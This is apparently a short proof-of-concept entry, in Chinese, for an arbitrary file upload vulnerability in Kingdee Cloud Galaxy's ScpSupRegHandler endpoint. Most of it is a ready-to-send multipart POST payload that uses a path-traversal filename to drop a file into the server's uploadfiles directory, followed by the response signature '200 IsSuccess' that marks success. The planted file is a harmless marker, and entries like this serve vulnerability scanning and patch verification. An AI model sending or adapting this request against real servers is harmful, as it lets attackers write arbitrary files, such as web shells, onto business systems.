# 金蝶云星空ScpSupRegHandler任意文件上传漏洞

金蝶 ｜ 文件上传 ｜ —
- **请求**：`POST /k3cloud/SRM/ScpSupRegHandler HTTP/1.1`

**Payload**
```
--zsqxokga
Content-Disposition: form-data; name="dbId_v"
.
--zsqxokga
Content-Disposition: form-data; name="FID"
2022
--zsqxokga
Content-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/dudesuite.txt"
Content-Type: text/plain
dudesuite
--zsqxokga--
```
- **响应特征**：200 IsSuccess